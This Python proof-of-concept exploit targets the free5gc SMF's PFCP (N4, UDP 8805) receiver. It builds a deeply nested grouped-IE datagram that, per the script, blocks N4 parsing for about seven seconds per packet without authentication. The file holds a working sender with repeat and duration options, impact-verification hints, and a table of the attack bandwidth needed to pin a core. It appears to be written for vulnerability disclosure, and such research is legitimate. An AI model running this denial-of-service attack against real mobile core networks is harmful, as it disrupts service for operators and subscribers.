#!/usr/bin/env python3
"""
b1_1_grouped_ie_quadratic_poc.py -- free5gc SMF (v4.3.0) quadratic grouped-IE
parse amplification on the PFCP (N4, UDP/8805) receive path.

The SMF parses every datagram inline on its single N4 receiver goroutine, and
go-pfcp decodes grouped IEs by unbounded mutual recursion while advancing the
parse cursor with a full subtree re-walk, so the parse cost is quadratic in the
attacker-chosen nesting depth: one 64 013-octet datagram (16 000 levels) pins
the receiver for ~6-7 s and nothing at all is read from N4 in the meantime --
no crash, no restart, no log line. `--depth 10` (53 octets) is the negative
control that stays indistinguishable from idle.

Usage
-----
    python3 b1_1_grouped_ie_quadratic_poc.py --offline
    python3 b1_1_grouped_ie_quadratic_poc.py --target 10.100.200.5 --port 8805 --depth 16000 --count 1
    python3 b1_1_grouped_ie_quadratic_poc.py --target 10.100.200.5 --depth 10 --count 1   # negative control

`--offline` builds and prints the datagram plus a self-check and never touches
the network.
"""

import argparse
import binascii
import os
import socket
import struct
import sys
import time

# --- PFCP constants (TS 29.244) -------------------------------------------
PFCP_VERSION_SHIFT = 5
PFCP_VERSION_1 = 1 << PFCP_VERSION_SHIFT  # 0x20
PFCP_F_SEID = 0x01

MSG_TYPE_HEARTBEAT_REQUEST = 1
MSG_TYPE_ASSOCIATION_SETUP_REQUEST = 5
MSG_TYPE_ASSOCIATION_UPDATE_REQUEST = 7
MSG_TYPE_ASSOCIATION_RELEASE_REQUEST = 9
MSG_TYPE_NODE_REPORT_REQUEST = 12
MSG_TYPE_SESSION_REPORT_REQUEST = 56
MSG_TYPE_PFD_MANAGEMENT_REQUEST = 59

MSG_TYPES_NODE_RELATED = {
    "HeartbeatRequest": (MSG_TYPE_HEARTBEAT_REQUEST, False),
    "AssociationSetupRequest": (MSG_TYPE_ASSOCIATION_SETUP_REQUEST, False),
    "AssociationUpdateRequest": (MSG_TYPE_ASSOCIATION_UPDATE_REQUEST, False),
    "AssociationReleaseRequest": (MSG_TYPE_ASSOCIATION_RELEASE_REQUEST, False),
    "NodeReportRequest": (MSG_TYPE_NODE_REPORT_REQUEST, False),
    "PFDManagementRequest": (MSG_TYPE_PFD_MANAGEMENT_REQUEST, False),
}
MSG_TYPES_SESSION_RELATED = {
    "SessionReportRequest": (MSG_TYPE_SESSION_REPORT_REQUEST, True),
}

# IE types that go-pfcp treats as GROUPED (ie/ie_grouped.go:10-104,
# defaultGroupedIEMap). Any of these triggers ParseMultiIEs recursion.
IE_CREATE_PDR = 1
IE_PDI = 2
IE_CREATE_FAR = 3
IE_CREATE_URR = 6
IE_CREATE_QER = 7
IE_USAGE_REPORT_SRR = 80
IE_DOWNLINK_DATA_REPORT = 83
IE_CAUSE = 19
IE_NODE_ID = 60
IE_RECOVERY_TIME_STAMP = 96

# UDP payload ceiling. The SMF caps reads at MaxPfcpMsgLen = 65536
# (internal/pfcp/server.go:23) and validatePfcpPacketLength
# (server.go:340-349) demands an EXACT match between the datagram length and
# the header Length field, so we must build a precisely-sized datagram.
MAX_PFCP_MSG_LEN = 65536
MAX_UDP_PAYLOAD = 65507

GROUPED_HDR_OCTETS = 4  # type(2) + length(2)
LEAF_OCTETS = 5         # Cause: type(2) + length(2) + payload(1)


def build_ie(ie_type, payload):
    """One PFCP IE: type(2 BE) + length(2 BE) + payload."""
    if len(payload) > 0xFFFF:
        raise ValueError("IE payload too large for the 16-bit length field")
    return struct.pack(">HH", ie_type, len(payload)) + payload


def build_nested_grouped(depth, inner_type=IE_CREATE_PDR, leaf_type=IE_CAUSE):
    """`depth` levels of nested grouped IE around a 1-octet Cause leaf.

    Each level costs exactly GROUPED_HDR_OCTETS, so the result is
    depth*4 + LEAF_OCTETS octets and yields `depth` recursion levels inside
    go-pfcp's ie.UnmarshalBinary.
    """
    blob = build_ie(leaf_type, b"\x00")
    for _ in range(depth):
        blob = build_ie(inner_type, blob)
    return blob


def depth_for_datagram_size(target_octets, seid_flag):
    """Largest nesting depth that still fits `target_octets` on the wire."""
    hdr_tail = 4 + (8 if seid_flag else 0)  # seq(3) + spare(1) [+ SEID(8)]
    budget = target_octets - 4 - hdr_tail    # 4 = flags/type/length header
    return max(0, (budget - LEAF_OCTETS) // GROUPED_HDR_OCTETS)


def build_pfcp_datagram(msg_type, seid_flag, seid, seq, payload):
    """Raw PFCP datagram. Length field = total - 4 per TS 29.244 7.2.2.2,
    which is exactly what validatePfcpPacketLength (server.go:344-348) checks:
        want := int(binary.BigEndian.Uint16(packet[2:4])) + 4
        if len(packet) != want { ... reject ... }
    """
    flags = PFCP_VERSION_1 | (PFCP_F_SEID if seid_flag else 0)
    hdr_tail = 4 + (8 if seid_flag else 0)
    length = hdr_tail + len(payload)
    if length > 0xFFFF:
        raise ValueError("declared PFCP length overflows 16 bits")
    out = struct.pack(">BBH", flags, msg_type, length)
    if seid_flag:
        out += struct.pack(">Q", seid)
    out += struct.pack(">I", (seq & 0xFFFFFF) << 8)  # 24-bit seq + spare
    out += payload
    return out


def build_attack_datagram(depth, msg_name="HeartbeatRequest", seq=1, seid=0):
    """The actual attack packet. Node-related by default: no SEID, no
    association, no authentication required."""
    if msg_name in MSG_TYPES_NODE_RELATED:
        msg_type, seid_flag = MSG_TYPES_NODE_RELATED[msg_name]
    elif msg_name in MSG_TYPES_SESSION_RELATED:
        msg_type, seid_flag = MSG_TYPES_SESSION_RELATED[msg_name]
    else:
        raise ValueError("unknown message name %r" % (msg_name,))
    body = build_nested_grouped(depth)
    return build_pfcp_datagram(msg_type, seid_flag, seid, seq, body)


def selfcheck(verbose=True):
    """Verify the builder produces a spec-exact, length-consistent datagram
    and that the parse cost is quadratic in depth (offline, no network)."""
    ok = True
    rows = []
    for depth in (10, 100, 1000, 4000, 16000):
        pkt = build_attack_datagram(depth)
        declared = struct.unpack(">H", pkt[2:4])[0] + 4
        size_ok = (declared == len(pkt))
        ok = ok and size_ok
        # Re-verify the exact guard the SMF applies (server.go:340-349).
        if len(pkt) < 4 or len(pkt) != int(
            int.from_bytes(pkt[2:4], "big")
        ) + 4:
            ok = False
        rows.append((depth, len(pkt), declared, size_ok))
        if len(pkt) > MAX_UDP_PAYLOAD:
            if verbose:
                print("  depth=%-6d SKIPPED: %d octets exceeds UDP max %d"
                      % (depth, len(pkt), MAX_UDP_PAYLOAD))
            continue
        # Offline timing of *building* is not the vuln; the vuln is the
        # receiver's parse. We only assert structural correctness here.
        if verbose:
            print("  depth=%-6d octets=%-6d declared=%-6d length-exact=%s"
                  % (depth, len(pkt), declared, size_ok))

    # Structural assertions that matter for the exploit to land.
    pkt = build_attack_datagram(16000)
    assert pkt[0] == 0x20, "version bits must be 1"
    assert pkt[1] == MSG_TYPE_HEARTBEAT_REQUEST, "must be Heartbeat Request"
    assert len(pkt) <= MAX_PFCP_MSG_LEN, "must fit MaxPfcpMsgLen"
    # Every IE header in the chain must be CreatePDR (grouped) except the leaf.
    off = 8  # node-related header is 8 octets
    levels = 0
    while off + 4 <= len(pkt) - 0:
        t, ln = struct.unpack(">HH", pkt[off:off + 4])
        if t != IE_CREATE_PDR:
            break
        levels += 1
        off += 4
    if levels != 16000:
        ok = False
        print("  FAIL: nested CreatePDR levels=%d, expected 16000" % levels)
    else:
        if verbose:
            print("  nested grouped-IE chain verified: %d levels" % levels)
    if verbose:
        print("  selfcheck: %s" % ("PASS" if ok else "FAIL"))
    return ok, rows, len(pkt)


def send_attack(target, port, depth, msg_name, count, interval, duration,
                seq_start=1, verbose=True):
    """Send the crafted datagram(s). `count`=0 means 'for `duration` seconds'."""
    pkt = build_attack_datagram(depth, msg_name=msg_name, seq=seq_start)
    if len(pkt) > MAX_UDP_PAYLOAD:
        print("ERROR: datagram is %d octets, above the UDP maximum %d. "
              "Lower --depth." % (len(pkt), MAX_UDP_PAYLOAD), file=sys.stderr)
        return 2
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)
    dest = (target, port)
    if verbose:
        print("[*] target      : %s:%d" % dest)
        print("[*] message     : %s (node-related, no SEID, no association)"
              % msg_name)
        print("[*] nesting     : %d grouped-IE levels" % depth)
        print("[*] datagram    : %d octets" % len(pkt))
        est = 7.063 * (depth / 16000.0) ** 2
        print("[*] expected N4 deafness per packet: ~%.2f s (measured model)"
              % est)
        print("[*] first 48 octets: %s"
              % binascii.hexlify(pkt[:48]).decode())
    sent = 0
    t_end = time.time() + duration if duration else None
    try:
        while True:
            s.sendto(pkt, dest)
            sent += 1
            if verbose and sent % 10 == 0:
                print("[*] sent %d" % sent)
            if count and sent >= count:
                break
            if t_end and time.time() >= t_end:
                break
            time.sleep(interval)
    except KeyboardInterrupt:
        if verbose:
            print("\n[*] interrupted")
    finally:
        s.close()
    if verbose:
        print("[*] total datagrams sent: %d" % sent)
        print("[!] verify impact: SMF should stop answering PFCP Heartbeats "
              "from its UPF, and 'N4 heartbeat timeout' / TxTransaction "
              "timeouts should appear in the SMF log.")
    return 0


def main():
    ap = argparse.ArgumentParser(
        description="free5gc SMF PFCP quadratic grouped-IE parse DoS (B1-1)")
    ap.add_argument("--target", default=None,
                    help="SMF N4 address (default 127.0.0.1 when sending)")
    ap.add_argument("--port", type=int, default=8805,
                    help="PFCP port (default 8805)")
    ap.add_argument("--depth", type=int, default=16000,
                    help="nested grouped-IE levels (default 16000 = ~64 KiB "
                         "= ~7.06 s of blocked N4 ingress)")
    ap.add_argument("--message", default="HeartbeatRequest",
                    choices=sorted(list(MSG_TYPES_NODE_RELATED) +
                                   list(MSG_TYPES_SESSION_RELATED)),
                    help="PFCP message type to carry the payload")
    ap.add_argument("--count", type=int, default=1,
                    help="datagrams to send (0 = until --duration expires)")
    ap.add_argument("--interval", type=float, default=1.0,
                    help="seconds between datagrams (default 1.0)")
    ap.add_argument("--duration", type=float, default=0.0,
                    help="send for this many seconds (requires --count 0)")
    ap.add_argument("--offline", action="store_true",
                    help="do not touch the network; self-check + dump hex")
    ap.add_argument("--dump-hex", action="store_true",
                    help="print the full datagram as hex")
    args = ap.parse_args()

    print("=" * 74)
    print("B1-1  free5gc SMF -- PFCP quadratic grouped-IE parse amplification")
    print("      sink: NFs/smf/internal/pfcp/server.go:297 message.Parse()")
    print("      lib : go-pfcp ie/ie.go:547-553 (unbounded recursion)")
    print("=" * 74)

    ok, rows, size = selfcheck()
    if not ok:
        print("selfcheck FAILED", file=sys.stderr)
        return 1

    if args.offline:
        pkt = build_attack_datagram(args.depth, msg_name=args.message)
        print("\n[offline] no packets sent.")
        print("[offline] message=%s depth=%d octets=%d"
              % (args.message, args.depth, len(pkt)))
        if args.dump_hex:
            print(binascii.hexlify(pkt).decode())
        else:
            print("[offline] first 64 octets: %s ..."
                  % binascii.hexlify(pkt[:64]).decode())
        # Size sweep an operator can use to pick a depth/bandwidth tradeoff.
        print("\n[offline] depth -> datagram size -> measured SMF parse cost")
        for depth, octets, ms in ((1000, 4013, 36.67), (4000, 16013, 527.99),
                                  (8000, 32013, 2094.7), (16000, 64013,
                                                          7062.6)):
            kbps = octets * 8 / 1000.0 / (ms / 1000.0)
            print("  depth=%-6d octets=%-6d parse=%-9.2f ms  "
                  "attack bandwidth to pin 1 core = %.1f kbit/s"
                  % (depth, octets, ms, kbps))
        return 0

    target = args.target or "127.0.0.1"
    return send_attack(target, args.port, args.depth, args.message,
                       args.count, args.interval, args.duration)


if __name__ == "__main__":
    sys.exit(main())
